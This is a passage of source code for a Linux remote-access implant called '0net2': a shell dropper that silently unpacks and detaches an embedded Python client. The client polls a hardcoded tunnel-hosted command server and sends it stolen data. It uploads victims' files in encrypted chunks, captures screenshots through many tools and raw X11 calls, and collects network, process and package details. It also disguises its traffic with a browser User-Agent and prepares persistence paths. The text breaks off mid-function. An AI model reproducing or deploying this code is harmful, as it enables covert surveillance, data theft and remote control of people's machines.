#!/bin/sh
# 0net2 client - single file, silent, persistent
set -u
umask 077

self=$0
case $self in */*) ;; *) self=./$self ;; esac
here=$(cd "$(dirname "$self")" 2>/dev/null && pwd) || exit 0
src=$here/$(basename "$self")
[ -r "$src" ] || exit 0

home=${HOME:-}
[ -n "$home" ] || home=$(getent passwd "$(id -u)" 2>/dev/null | cut -d: -f6)
[ -n "$home" ] || home=/tmp

dir=${XDG_DATA_HOME:-$home/.local/share}/0net2
mkdir -p "$dir" 2>/dev/null || { dir=/tmp/.0net2-$(id -u); mkdir -p "$dir" 2>/dev/null || exit 0; }

py=
for c in python3 python3.13 python3.12 python3.11 python3.10 python3.9 python3.8 python3.7 python3.6 python; do
    command -v "$c" >/dev/null 2>&1 && { py=$(command -v "$c"); break; }
done
[ -n "$py" ] || exit 0

# CRLF tolerant, every CR stripped
awk 'p{print} /^#::PAYLOAD\r?$/{p=1}' "$src" 2>/dev/null | tr -d '\r' > "$dir/.p" 2>/dev/null
[ -s "$dir/.p" ] || { rm -f "$dir/.p"; exit 0; }
head -n 1 "$dir/.p" | grep -q '^#!' || { rm -f "$dir/.p"; exit 0; }
grep -q 'def device_fingerprint' "$dir/.p" || { rm -f "$dir/.p"; exit 0; }
mv -f "$dir/.p" "$dir/client.py" 2>/dev/null || exit 0
chmod 700 "$dir/client.py" 2>/dev/null

cat > "$dir/launch.sh" <<'LAUNCH'
#!/bin/sh
d=$(cd "$(dirname "$0")" 2>/dev/null && pwd) || exit 0
[ -n "${HOME:-}" ] || exit 0
[ -n "${DISPLAY:-}" ] || export DISPLAY=:0
[ -n "${XAUTHORITY:-}" ] || { [ -f "$HOME/.Xauthority" ] && export XAUTHORITY="$HOME/.Xauthority"; }
if [ -z "${WAYLAND_DISPLAY:-}" ] && [ -n "${XDG_RUNTIME_DIR:-}" ] && [ -S "$XDG_RUNTIME_DIR/wayland-0" ]; then
    export WAYLAND_DISPLAY=wayland-0
fi
py=
for c in python3 python3.13 python3.12 python3.11 python3.10 python3.9 python3.8 python3.7 python3.6 python; do
    command -v "$c" >/dev/null 2>&1 && { py=$(command -v "$c"); break; }
done
[ -n "$py" ] || exit 0
exec setsid "$py" "$d/client.py" --detached
LAUNCH
chmod 700 "$dir/launch.sh" 2>/dev/null

setsid "$dir/launch.sh" </dev/null >/dev/null 2>&1 &
exit 0

#::PAYLOAD
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import re
import sys
import ssl
import json
import time
import hmac
import zlib
import base64
import socket
import shutil
import signal
import ctypes
import hashlib
import platform
import binascii
import ctypes.util
import subprocess
import http.client as _httpc
import urllib.parse
import urllib.request

BUILD = "0net2-7"
SERVER = "https://ross-subject-look-june.trycloudflare.com"
SERVER_ALT = ""          # plain LAN fallback, e.g. http://192.168.1.50:3000
KEYSTR = "NVKDLFOIUSJKDLE2"
VMBLOCK = False

def _home():
    h = os.environ.get("HOME") or ""
    if h and os.path.isdir(h):
        return h
    try:
        import pwd
        return pwd.getpwuid(os.getuid()).pw_dir or "/"
    except Exception:
        return "/"

HOME = _home()

def _datadir():
    base = os.environ.get("XDG_DATA_HOME") or os.path.join(HOME, ".local", "share")
    c = os.path.join(base, "0net2")
    try:
        os.makedirs(c, 0o700, exist_ok=True)
        return c
    except Exception:
        pass
    c = "/tmp/.0net2-%d" % os.getuid()
    os.makedirs(c, 0o700, exist_ok=True)
    return c

DIR = _datadir()
SCRIPT = os.path.join(DIR, "client.py")
LAUNCH = os.path.join(DIR, "launch.sh")
CFG = os.path.join(DIR, "config.json")
IDF = os.path.join(DIR, "id.dat")
VMFLAG = os.path.join(DIR, "vm.block")
LOCK = os.path.join(DIR, ".lock")
LOGF = os.path.join(DIR, "client.log")
UNITDIR = os.path.join(HOME, ".config", "systemd", "user")
UNIT = os.path.join(UNITDIR, "0net2.service")
AUTODIR = os.path.join(HOME, ".config", "autostart")
AUTO = os.path.join(AUTODIR, "0net2.desktop")

TMP = "/tmp/.0net2-%d" % os.getuid()
try:
    os.makedirs(TMP, 0o700, exist_ok=True)
except Exception:
    TMP = os.path.join(DIR, "tmp")
    os.makedirs(TMP, 0o700, exist_ok=True)

CWD = HOME if os.path.isdir(HOME) else "/"
SECRET = ""
POLLSEC = 3
CHUNK = 262144
OUTMAX = 400000
CMDTMO = 300.0
FAIL = 0
TICK = 0
SEEN = {}
UA = ""
DEVICE_ID = ""

def log(m):
    try:
        with open(LOGF, "a", encoding="utf-8", errors="replace") as f:
            f.write(time.strftime("%H:%M:%S") + " " + m + "\n")
        if os.path.getsize(LOGF) > 524288:
            open(LOGF, "w").close()
    except Exception:
        pass

# --- crypto ---

def kdf(ks, info, n):
    prk = hmac.new(b"0net2-v8", ks.encode("utf-8"), hashlib.sha256).digest()
    return hmac.new(prk, info.encode("ascii") + b"\x01", hashlib.sha256).digest()[:n]

_ENC = _DEC = None
_READY = False
_GF = {}

def _load():
    global _ENC, _DEC, _READY
    if _READY:
        return
    _READY = True
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        _ENC = lambda k, iv, d: (lambda e: e.update(d) + e.finalize())(Cipher(algorithms.AES(k), modes.CBC(iv)).encryptor())
        _DEC = lambda k, iv, d: (lambda x: x.update(d) + x.finalize())(Cipher(algorithms.AES(k), modes.CBC(iv)).decryptor())
        return
    except Exception:
        pass
    try:
        from Crypto.Cipher import AES as _A
        _ENC = lambda k, iv, d: _A.new(k, _A.MODE_CBC, iv).encrypt(d)
        _DEC = lambda k, iv, d: _A.new(k, _A.MODE_CBC, iv).decrypt(d)
        return
    except Exception:
        pass
    _ENC = lambda k, iv, d: _AES(k).enc_cbc(d, iv)
    _DEC = lambda k, iv, d: _AES(k).dec_cbc(d, iv)

class _AES:
    SB = bytes.fromhex(
        "637c777bf26b6fc53001672bfed7ab76ca82c97dfa5947f0add4a2af9ca472c0"
        "b7fd9326363ff7cc34a5e5f171d8311504c723c31896059a071280e2eb27b275"
        "09832c1a1b6e5aa0523bd6b329e32f8453d100ed20fcb15b6acbbe394a4c58cf"
        "d0efaafb434d338545f9027f503c9fa851a3408f929d38f5bcb6da2110fff3d2"
        "cd0c13ec5f974417c4a77e3d645d197360814fdc222a908846eeb814de5e0bdb"
        "e0323a0a4906245cc2d3ac629195e479e7c8376d8dd54ea96c56f4ea657aae08"
        "ba78252e1ca6b4c6e8dd741f4bbd8b8a703eb5664803f60e613557b986c11d9e"
        "e1f8981169d98e949b1e87e9ce5528df8ca1890dbfe6426841992d0fb054bb16")
    INV = bytes(256)
    _inv = [0] * 256
    for _i, _v in enumerate(SB):
        _inv[_v] = _i
    INV = bytes(_inv)
    del _i, _v, _inv
    RC = (0x01000000, 0x02000000, 0x04000000, 0x08000000, 0x10000000,
          0x20000000, 0x40000000, 0x80000000, 0x1B000000, 0x36000000)

    def __init__(self, key):
        k = list(key)
        w = [0] * 44
        for i in range(4):
            w[i] = (k[4 * i] << 24) | (k[4 * i + 1] << 16) | (k[4 * i + 2] << 8) | k[4 * i + 3]
        s = self.SB
        for i in range(4, 44):
            t = w[i - 1]
            if i % 4 == 0:
                t = (s[(t >> 16) & 255] << 24 | s[(t >> 8) & 255] << 16
                     | s[t & 255] << 8 | s[t >> 24]) ^ self.RC[i // 4 - 1]
            w[i] = w[i - 4] ^ t
        self.w = w

    @staticmethod
    def _m(a, b):
        k = (a << 8) | b
        v = _GF.get(k)
        if v is not None:
            return v
        p = 0
        for _ in range(8):
            if b & 1:
                p ^= a
            c = a & 0x80
            a = (a << 1) & 0xFF
            if c:
                a ^= 0x1B
            b >>= 1
        _GF[k] = p
        return p

    def _ark(self, st, r):
        for i in range(4):
            for j in range(4):
                st[i][j] ^= (self.w[r * 4 + j] >> (24 - 8 * i)) & 255

    def _rot(self, st):
        for i in (1, 2, 3):
            st[i] = st[i][i:] + st[i][:i]

    def _enc(self, blk):
        st = [[blk[4 * j + i] for j in range(4)] for i in range(4)]
        s = self.SB
        self._ark(st, 0)
        for r in range(1, 10):
            for i in range(4):
                for j in range(4):
                    st[i][j] = s[st[i][j]]
            self._rot(st)
            for j in range(4):
                a = [st[i][j] for i in range(4)]
                st[0][j] = self._m(2, a[0]) ^ self._m(3, a[1]) ^ a[2] ^ a[3]
                st[1][j] = a[0] ^ self._m(2, a[1]) ^ self._m(3, a[2]) ^ a[3]
                st[2][j] = a[0] ^ a[1] ^ self._m(2, a[2]) ^ self._m(3, a[3])
                st[3][j] = self._m(3, a[0]) ^ a[1] ^ a[2] ^ self._m(2, a[3])
            self._ark(st, r)
        for i in range(4):
            for j in range(4):
                st[i][j] = s[st[i][j]]
        self._rot(st)
        self._ark(st, 10)
        return bytes(st[i][j] for j in range(4) for i in range(4))

    def _dec(self, blk):
        st = [[blk[4 * j + i] for j in range(4)] for i in range(4)]
        inv = self.INV
        self._ark(st, 10)
        for r in range(9, 0, -1):
            for i in (1, 2, 3):
                st[i] = st[i][-i:] + st[i][:-i]
            for i in range(4):
                for j in range(4):
                    st[i][j] = inv[st[i][j]]
            self._ark(st, r)
            for j in range(4):
                a = [st[i][j] for i in range(4)]
                st[0][j] = self._m(14, a[0]) ^ self._m(11, a[1]) ^ self._m(13, a[2]) ^ self._m(9, a[3])
                st[1][j] = self._m(9, a[0]) ^ self._m(14, a[1]) ^ self._m(11, a[2]) ^ self._m(13, a[3])
                st[2][j] = self._m(13, a[0]) ^ self._m(9, a[1]) ^ self._m(14, a[2]) ^ self._m(11, a[3])
                st[3][j] = self._m(11, a[0]) ^ self._m(13, a[1]) ^ self._m(9, a[2]) ^ self._m(14, a[3])
        for i in (1, 2, 3):
            st[i] = st[i][-i:] + st[i][:-i]
        for i in range(4):
            for j in range(4):
                st[i][j] = inv[st[i][j]]
        self._ark(st, 0)
        return bytes(st[i][j] for j in range(4) for i in range(4))

    def enc_cbc(self, d, iv):
        out = b""
        prev = iv
        for i in range(0, len(d), 16):
            prev = self._enc(bytes(x ^ y for x, y in zip(d[i:i + 16], prev)))
            out += prev
        return out

    def dec_cbc(self, d, iv):
        out = b""
        prev = iv
        for i in range(0, len(d), 16):
            blk = d[i:i + 16]
            out += bytes(x ^ y for x, y in zip(self._dec(blk), prev))
            prev = blk
        return out

def enc_hex(t, ks):
    _load()
    d = t.encode("utf-8")
    n = 16 - (len(d) % 16)
    d += bytes([n]) * n
    iv = os.urandom(16)
    return binascii.hexlify(iv + _ENC(kdf(ks, "aes", 16), iv, d)).decode("ascii")

def dec_hex(hx, ks):
    if not hx or len(hx) % 32:
        return ""
    try:
        raw = binascii.unhexlify(hx)
    except Exception:
        return ""
    if len(raw) < 32:
        return ""
    iv, ct = raw[:16], raw[16:]
    _load()
    try:
        pt = _DEC(kdf(ks, "aes", 16), iv, ct)
    except Exception:
        return ""
    if not pt:
        return ""
    n = pt[-1]
    if 1 <= n <= 16 and len(pt) >= n and pt[-n:] == bytes([n]) * n:
        pt = pt[:-n]
    try:
        return pt.decode("utf-8")
    except Exception:
        return ""

def sha_hex(s):
    return hashlib.sha256(s.encode("utf-8")).hexdigest()

def mac_hex(s, ks):
    return hmac.new(kdf(ks, "mac", 32), s.encode("utf-8"), hashlib.sha256).hexdigest()

def auth_token(ts, n, ks):
    return hmac.new(kdf(ks, "auth", 32), (ts + ":" + n).encode("utf-8"), hashlib.sha256).hexdigest()

# --- config ---

def save_cfg():
    try:
        os.makedirs(DIR, 0o700, exist_ok=True)
        o = {"server": SERVER, "alt": SERVER_ALT, "key": KEYSTR,
             "secret": SECRET, "build": BUILD, "ua": UA}
        with open(CFG, "w", encoding="utf-8") as f:
            json.dump(o, f, separators=(",", ":"))
        os.chmod(CFG, 0o600)
    except Exception:
        pass

def load_cfg():
    global SERVER, SERVER_ALT, KEYSTR, SECRET
    try:
        with open(CFG, "r", encoding="utf-8") as f:
            j = json.load(f)
        for k, cur in (("server", SERVER), ("alt", SERVER_ALT), ("key", KEYSTR), ("secret", SECRET)):
            v = j.get(k)
            if isinstance(v, str):
                if k == "alt" or v:
                    if k == "server":   SERVER = v
                    elif k == "alt":    SERVER_ALT = v
                    elif k == "key":    KEYSTR = v
                    else:               SECRET = v
    except Exception:
        pass
    if not SECRET:
        try:
            with open(IDF, "r", encoding="utf-8") as f:
                SECRET = f.read().strip()
        except Exception:
            pass
    SERVER = SERVER.rstrip("/")
    SERVER_ALT = SERVER_ALT.rstrip("/")

# --- process ---

def _cmdlines():
    out = []
    try:
        for pid in os.listdir("/proc"):
            if not pid.isdigit():
                continue
            try:
                with open("/proc/%s/cmdline" % pid, "rb") as f:
                    cl = f.read().replace(b"\x00", b" ").decode("utf-8", "replace")
            except Exception:
                continue
            out.append((int(pid), cl))
    except Exception:
        pass
    return out

def stop_old():
    me = os.getpid()
    n = 0
    for pid, cl in _cmdlines():
        if pid != me and SCRIPT in cl:
            try:
                os.kill(pid, signal.SIGKILL)
                n += 1
            except Exception:
                pass
    time.sleep(0.35)
    return n

def take_lock():
    import fcntl
    try:
        fd = os.open(LOCK, os.O_RDWR | os.O_CREAT, 0o600)
    except Exception:
        return None
    try:
        fcntl.flock(fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
        return fd
    except Exception:
        os.close(fd)
        return None

def daemonize():
    if os.fork() > 0:
        os._exit(0)
    os.setsid()
    if os.fork() > 0:
        os._exit(0)
    d = os.open(os.devnull, os.O_RDWR)
    for i in (0, 1, 2):
        os.dup2(d, i)
    if d > 2:
        os.close(d)

# --- http ---

def _ctx(verify):
    if verify:
        try:
            return ssl.create_default_context()
        except Exception:
            pass
    return ssl._create_unverified_context()

def http(method, path, body, headers, base=None):
    res = {"body": "", "sig": "", "enroll": "", "keymode": "", "code": 0, "err": ""}
    try:
        u = urllib.parse.urlsplit(base or SERVER)
        host = u.hostname or "127.0.0.1"
        port = u.port
    except Exception as e:
        res["err"] = "bad url " + str(e)
        return res
    https = (u.scheme == "https")
    if port is None:
        port = 443 if https else 80

    for attempt in (0, 1):
        conn = None
        try:
            if https:
                conn = _httpc.HTTPSConnection(host, port, timeout=15, context=_ctx(attempt == 0))
            else:
                conn = _httpc.HTTPConnection(host, port, timeout=15)
            h = dict(headers)
            h["User-Agent"] = UA
            h["Accept"] = "*/*"
            h["Connection"] = "close"
            conn.request(method, path, body=body if body else None, headers=h)
            r = conn.getresponse()
            res["code"] = int(r.status)
            res["sig"] = r.getheader("X-Signature") or ""
            res["enroll"] = r.getheader("X-Enroll") or ""
            res["keymode"] = r.getheader("X-Key-Mode") or ""
            try:
                res["body"] = r.read().decode("ascii", "ignore")
            except Exception:
                pass
            try:
                conn.close()
            except Exception:
                pass
            return res
        except Exception as e:
            res["err"] = type(e).__name__ + ": " + str(e)[:120]
            if conn:
                try:
                    conn.close()
                except Exception:
                    pass
            if not https or attempt == 1:
                return res
    return res

def now_ms():
    return str(int(time.time() * 1000))

def auth_headers(mode):
    ts = now_ms()
    n = binascii.hexlify(os.urandom(16)).decode("ascii")
    ks = SECRET if (mode == "secret" and SECRET) else KEYSTR
    return {"X-Timestamp": ts, "X-Nonce": n, "X-Auth-Token": auth_token(ts, n, ks),
            "X-Client-ID": DEVICE_ID, "X-Key-Mode": mode, "X-Platform": "linux"}

def send(path, plain):
    global SECRET
    if len(plain) > OUTMAX:
        plain = plain[:OUTMAX] + "\n[truncated]\n"
    ks = SECRET or KEYSTR
    hx = enc_hex(plain, ks)
    h = auth_headers("secret" if SECRET else "global")
    h["X-Signature"] = mac_hex(hx, ks)
    r = http("POST", path, hx.encode("ascii"), h)
    log("POST " + path + " -> " + str(r["code"]) + (" " + r["err"] if r["err"] else ""))
    if r["enroll"]:
        SECRET = r["enroll"]
        save_cfg()
        log("ENROLLED (POST)")
    return r

def poll():
    global SECRET, TICK, SERVER
    mode = "secret" if SECRET else "global"
    r = http("GET", "/", None, auth_headers(mode))

    if r["code"] == 0 and SERVER_ALT and SERVER_ALT != SERVER:
        log("primary dead (" + r["err"] + ") -> alt")
        r2 = http("GET", "/", None, auth_headers(mode), base=SERVER_ALT)
        if r2["code"] != 0:
            log("ALT OK -> switching")
            SERVER = SERVER_ALT
            r = r2

    if r["code"] == 0:
        log("GET netfail " + r["err"])
        return {"ok": False, "text": ""}

    # server and client disagree on the secret. one resync on the fleet key,
    # only accepted from the address we last authed from.
    if r["code"] == 403 and not r["enroll"] and SECRET:
        log("403 with secret -> resync")
        r2 = http("GET", "/", None, auth_headers("global"))
        if r2["enroll"]:
            SECRET = r2["enroll"]
            save_cfg()
            log("RESYNC")
        if r2["code"] == 200:
            r = r2
        else:
            return {"ok": True, "text": ""}

    if r["enroll"]:
        SECRET = r["enroll"]
        save_cfg()
        log("ENROLLED")

    if r["code"] != 200:
        log("GET " + str(r["code"]) + " km=" + r["keymode"] + " enrolled=" + str(bool(SECRET)))
        if r["body"] and not r["keymode"]:
            log("  body: " + r["body"][:160].replace("\n", " "))
        if r["keymode"] == "global" and SECRET and not r["enroll"]:
            SECRET = ""
            save_cfg()
            log("SECRET DROPPED")
        return {"ok": True, "text": ""}

    use = SECRET if (r["keymode"] == "secret" and SECRET) else KEYSTR
    alt = KEYSTR if use == KEYSTR else SECRET

    TICK += 1
    if TICK % 20 == 0:
        log("heartbeat len=" + str(len(r["body"])) + " sig=" + str(bool(r["sig"])))
    if r["body"]:
        log("GET 200 len=" + str(len(r["body"])) + " sig=" + str(bool(r["sig"])) + " km=" + r["keymode"])

    for k in (use, alt):
        if k and r["sig"] and hmac.compare_digest(mac_hex(r["body"], k), r["sig"]):
            return {"ok": True, "text": dec_hex(r["body"], k)}
    if r["body"]:
        return {"ok": True, "text": dec_hex(r["body"], use)}
    return {"ok": True, "text": ""}

def pub_ip():
    try:
        req = urllib.request.Request("https://api.ipify.org", headers={"User-Agent": UA})
        with urllib.request.urlopen(req, timeout=2.5) as f:
            return f.read(64).decode("ascii", "ignore").strip()
    except Exception:
        return "?"

# --- helpers ---

def run(args, timeout=2.0, cwd=None):
    p = None
    try:
        p = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, cwd=cwd)
        out, _ = p.communicate(timeout=timeout)
        return out.decode("utf-8", "replace").strip()
    except Exception:
        if p is not None:
            try:
                p.kill()
            except Exception:
                pass
        return ""

def rd(path):
    try:
        with open(path, "rb") as f:
            return f.read(65536).decode("utf-8", "replace").strip()
    except Exception:
        return ""

# --- identity ---
# canonical string, byte identical to generate_device_fingerprint_id() on the
# server. the UA is built once and frozen into config so a reboot can't change
# it. MID carries a random per-install salt: two clones of the same image have
# the same hostname, user and uid, so without it they hash to the same id and
# share one command queue.

SCREEN_RE = re.compile(r'SCR:(\d+)x(\d+)')
MID_RE = re.compile(r'MID:([0-9A-Fa-f]{6,16})')
PLATFORM_RE = re.compile(r'PLAT:([A-Za-z0-9.-]{1,24})')
DISTRO_RE = re.compile(r'DISTRO:([a-z0-9]{1,24})')

def get_screen():
    for cmd in (["xrandr", "--current"], ["wlr-randr"], ["hyprctl", "monitors"]):
        out = run(cmd, 1.5)
        if not out:
            continue
        m = re.search(r'(\d{3,5})x(\d{3,5})\+', out) or re.search(r'current\s+(\d{3,5})\s*x\s*(\d{3,5})', out)
        if m:
            return int(m.group(1)), int(m.group(2))
    return 1920, 1080

def distro_token():
    txt = (rd("/etc/os-release") + "\n" + rd("/usr/lib/os-release")).lower()
    for line in txt.split("\n"):
        if line.startswith("id="):
            v = re.sub(r'[^a-z0-9]', '', line[3:].strip().strip('"').strip("'"))[:24]
            if v:
                return v
    return ""

def device_fingerprint(ua):
    d = "LINUX"
    for tok, tag in (("x86_64", "_X64"), ("i686", "_X86"), ("aarch64", "_ARM64"), ("armv7l", "_ARM32")):
        if tok in ua:
            d += tag
            break
    m = DISTRO_RE.search(ua)
    if m:
        d += "_" + m.group(1).upper()
    if "Firefox" in ua:
        d += "_FIREFOX"
    elif "Chrome" in ua:
        d += "_CHROME"
    for rx, pre in ((SCREEN_RE, "SCR"), (PLATFORM_RE, "_PLAT"), (MID_RE, "_MID")):
        m = rx.search(ua)
        if m:
            d += pre + "".join(g.upper() for g in m.groups()) if pre == "_MID" else pre + "".join(m.groups())
    return sha_hex(d)[:6].upper()

def init_identity():
    global UA, DEVICE_ID
    if UA:
        return
    try:
        with open(CFG, "r", encoding="utf-8") as f:
            ua = json.load(f).get("ua")
        if isinstance(ua, str) and "PLAT:" in ua and "MID:" in ua:
            UA = ua
            DEVICE_ID = device_fingerprint(UA)
            return
    except Exception:
        pass
    sw, sh = get_screen()
    arch = platform.machine() or "x86_64"
    user = os.environ.get("USER") or os.environ.get("LOGNAME") or "user"
    salt = binascii.hexlify(os.urandom(8)).decode("ascii")
    mid = sha_hex("%s|%s|%d|%s" % (socket.gethostname(), user, os.getuid(), salt))[:8].upper()
    UA = ("Mozilla/5.0 (X11; Linux " + arch + ") AppleWebKit/537.36 (KHTML, like Gecko) "
          "Chrome/124.0.0.0 Safari/537.36 SCR:%dx%d PLAT:linux DISTRO:%s MID:%s"
          % (sw, sh, distro_token() or "linux", mid))
    DEVICE_ID = device_fingerprint(UA)
    save_cfg()

# --- uploads ---

def send_upload(tid, idx, total, name, data):
    global SECRET
    ks = SECRET or KEYSTR
    hx = enc_hex(base64.b64encode(data).decode("ascii"), ks)
    mode = "secret" if SECRET else "global"
    for _ in range(3):
        h = auth_headers(mode)
        h["X-Signature"] = mac_hex(hx, ks)
        h["X-Tid"] = tid
        h["X-Idx"] = str(idx)
        h["X-Total"] = str(total)
        h["X-Name"] = base64.b64encode(name.encode("utf-8")).decode("ascii")
        r = http("POST", "/upload", hx.encode("ascii"), h)
        if r["enroll"]:
            SECRET = r["enroll"]
            save_cfg()
        if r["code"] == 200:
            return True
        log("UPLOAD %d/%d -> %d" % (idx, total, r["code"]))
        time.sleep(0.7)
    log("UPLOAD FAILED " + name)
    return False

def send_file(path, tid):
    try:
        with open(path, "rb") as f:
            data = f.read()
    except Exception as e:
        log("SENDFILE FAIL " + str(e))
        return
    name = DEVICE_ID + "_" + os.path.basename(path)
    total = max(1, (len(data) + CHUNK - 1) // CHUNK)
    log("SENDFILE " + name + " " + str(len(data)))
    for i in range(total):
        send_upload(tid, i, total, name, data[i * CHUNK:(i + 1) * CHUNK])

# --- screenshot ---

def _png(path, w, h, rgb):
    import struct as _st
    raw = bytearray()
    stride = w * 3
    for y in range(h):
        raw.append(0)
        raw += rgb[y * stride:(y + 1) * stride]

    def ch(t, d):
        return _st.pack(">I", len(d)) + t + d + _st.pack(">I", zlib.crc32(t + d) & 0xFFFFFFFF)

    with open(path, "wb") as f:
        f.write(b"\x89PNG\r\n\x1a\n")
        f.write(ch(b"IHDR", _st.pack(">IIBBBBB", w, h, 8, 2, 0, 0, 0)))
        f.write(ch(b"IDAT", zlib.compress(bytes(raw), 6)))
        f.write(ch(b"IEND", b""))

def _x11(path):
    x11 = ctypes.CDLL(ctypes.util.find_library("X11") or "libX11.so.6")
    x11.XOpenDisplay.restype = ctypes.c_void_p
    x11.XOpenDisplay.argtypes = [ctypes.c_char_p]
    dpy = x11.XOpenDisplay(None)
    if not dpy:
        raise RuntimeError("cannot open " + str(os.environ.get("DISPLAY")))
    try:
        x11.XDefaultRootWindow.restype = ctypes.c_ulong
        x11.XDefaultRootWindow.argtypes = [ctypes.c_void_p]
        root = x11.XDefaultRootWindow(dpy)
        x11.XDefaultScreen.restype = ctypes.c_int
        x11.XDefaultScreen.argtypes = [ctypes.c_void_p]
        scr = x11.XDefaultScreen(dpy)
        for fn in ("XDisplayWidth", "XDisplayHeight"):
            getattr(x11, fn).restype = ctypes.c_int
            getattr(x11, fn).argtypes = [ctypes.c_void_p, ctypes.c_int]
        w, h = x11.XDisplayWidth(dpy, scr), x11.XDisplayHeight(dpy, scr)
        if w < 1 or h < 1:
            raise RuntimeError("zero display")

        class XImage(ctypes.Structure):
            _fields_ = [("width", ctypes.c_int), ("height", ctypes.c_int),
                        ("xoffset", ctypes.c_int), ("format", ctypes.c_int),
                        ("data", ctypes.c_void_p), ("byte_order", ctypes.c_int),
                        ("bitmap_unit", ctypes.c_int), ("bitmap_bit_order", ctypes.c_int),
                        ("bitmap_pad", ctypes.c_int), ("depth", ctypes.c_int),
                        ("bytes_per_line", ctypes.c_int), ("bits_per_pixel", ctypes.c_int),
                        ("red_mask", ctypes.c_ulong), ("green_mask", ctypes.c_ulong),
                        ("blue_mask", ctypes.c_ulong)]

        x11.XGetImage.restype = ctypes.c_void_p
        x11.XGetImage.argtypes = [ctypes.c_void_p, ctypes.c_ulong, ctypes.c_int, ctypes.c_int,
                                  ctypes.c_uint, ctypes.c_uint, ctypes.c_ulong, ctypes.c_int]
        ip = x11.XGetImage(dpy, root, 0, 0, w, h, ctypes.c_ulong(~0).value, 2)
        if not ip:
            raise RuntimeError("XGetImage failed")
        try:
            img = ctypes.cast(ip, ctypes.POINTER(XImage)).contents
            bpl, bpp = img.bytes_per_line, img.bits_per_pixel
            buf = ctypes.string_at(img.data, bpl * h)
            rgb = bytearray(w * h * 3)
            if bpp == 32 and img.byte_order == 0 and img.red_mask == 0xFF0000:
                stride = w * 3
                for y in range(h):
                    row = buf[y * bpl:y * bpl + w * 4]
                    o = y * stride
                    rgb[o:o + w * 3:3] = row[2::4]
                    rgb[o + 1:o + w * 3:3] = row[1::4]
                    rgb[o + 2:o + w * 3:3] = row[0::4]
            else:
                step = bpp // 8
                if step not in (2, 3, 4):
                    raise RuntimeError("depth " + str(bpp))
                rm, gm, bm = img.red_mask, img.green_mask, img.blue_mask

                def sc(v, m):
                    bits = bin(m).count("1")
                    if not bits:
                        return 0
                    v = (v & m) >> ((m & -m).bit_length() - 1)
                    return (v << (8 - bits)) & 0xFF if bits < 8 else (v >> (bits - 8)) & 0xFF

                order = "little" if img.byte_order == 0 else "big"
                i = o = 0
                for _ in range(h):
                    for _ in range(w):
                        px = int.from_bytes(buf[i:i + step], order)
                        rgb[o] = sc(px, rm)
                        rgb[o + 1] = sc(px, gm)
                        rgb[o + 2] = sc(px, bm)
                        i += step
                        o += 3
            _png(path, w, h, rgb)
        finally:
            x11.XDestroyImage.argtypes = [ctypes.c_void_p]
            x11.XDestroyImage(ip)
    finally:
        x11.XCloseDisplay.argtypes = [ctypes.c_void_p]
        x11.XCloseDisplay(dpy)

def take_shot(path):
    tools = [["grim", path], ["gnome-screenshot", "-f", path], ["spectacle", "-b", "-n", "-o", path],
             ["scrot", "-o", "-z", path], ["maim", path], ["import", "-window", "root", path],
             ["xfce4-screenshooter", "-f", "-s", path], ["mate-screenshot", "-f", path]]
    have = [t for t in tools if shutil.which(t[0])]
    errs = []
    disps = [d for d in (os.environ.get("DISPLAY"), ":0", ":0.0", ":1") if d]
    auths = [a for a in [os.environ.get("XAUTHORITY"),
                         os.path.join(HOME, ".Xauthority"),
                         "/run/user/%d/gdm/Xauthority" % os.getuid(),
                         "/run/user/%d/xauth/Xauthority" % os.getuid(),
                         "/var/run/lightdm/root/:0",
                         "/var/lib/lightdm/.Xauthority"] if a and os.path.exists(a)]
    for dsp in disps:
        os.environ["DISPLAY"] = dsp
        for a in auths or [""]:
            os.environ["XAUTHORITY"] = a
            for t in have:
                try:
                    os.unlink(path)
                except Exception:
                    pass
                run(t, 8.0)
                try:
                    if os.path.getsize(path) > 0:
                        return
                except Exception:
                    pass
            if shutil.which("xwd") and shutil.which("convert"):
                x = path + ".xwd"
                run(["xwd", "-root", "-silent", "-out", x], 8.0)
                if os.path.exists(x):
                    run(["convert", x, path], 8.0)
                    try:
                        os.unlink(x)
                    except Exception:
                        pass
                    try:
                        if os.path.getsize(path) > 0:
                            return
                    except Exception:
                        pass
            try:
                _x11(path)
                if os.path.getsize(path) > 0:
                    return
            except Exception as e:
                errs.append("%s/%s: %s" % (dsp, a or "-", e))
    raise RuntimeError("no display access (" + (errs[0] if errs else "none") + ")")

# --- info ---

def _ifs():
    out = []
    try:
        for n in sorted(os.listdir("/sys/class/net")):
            if n == "lo":
                continue
            ip = run(["sh", "-c", "ip -o -4 addr show dev '%s' 2>/dev/null | awk '{print $4}'" % n], 1.0) \
                or run(["sh", "-c", "ifconfig '%s' 2>/dev/null | awk '/inet /{print $2}'" % n], 1.0)
            out.append((n, ip or "-", rd("/sys/class/net/" + n + "/address") or "-"))
    except Exception:
        pass
    return out

def _dec4(h):
    try:
        return ".".join(str(x) for x in bytes.fromhex(h)[::-1])
    except Exception:
        return h

def _ports():
    lis, est = [], []
    for fn in ("/proc/net/tcp", "/proc/net/tcp6"):
        for line in rd(fn).split("\n")[1:]:
            f = line.split()
            if len(f) < 4:
                continue
            try:
                lip, lport = f[1].split(":")
                rip, rport = f[2].split(":")
                port = int(lport, 16)
            except Exception:
                continue
            if f[3] == "0A":
                if port not in lis:
                    lis.append(port)
            elif f[3] == "01" and len(est) < 12:
                est.append("%s:%d -> %s:%d" % (_dec4(lip), port, _dec4(rip), int(rport, 16)))
    return sorted(lis), est

def _procs():
    rows = []
    try:
        for pid in os.listdir("/proc"):
            if not pid.isdigit():
                continue
            name, rss = "", 0
            for line in rd("/proc/%s/status" % pid).split("\n"):
                if line.startswith("Name:"):
                    name = line[5:].strip()
                elif line.startswith("VmRSS:"):
                    try:
                        rss = int(line.split()[1]) // 1024
                    except Exception:
                        pass
            if name:
                rows.append((rss, name, pid))
    except Exception:
        pass
    rows.sort(reverse=True)
    return rows[:12]

def _pkgs():
    for c, q in (("dpkg-query", "dpkg-query -W -f='${Package}\\n'"), ("rpm", "rpm -qa"),
                 ("pacman", "pacman -Q | awk '{print $1}'"), ("apk", "apk info")):
        if shutil.which(c):
            return [x for x in run(["sh", "-c", q + " 2>/dev/null | head -n 400"], 4.0).split("\n") if x]
    return []

def _osr(k):
    for line in rd("/etc/os-release").split("\n"):
        if line.startswith(k + "="):
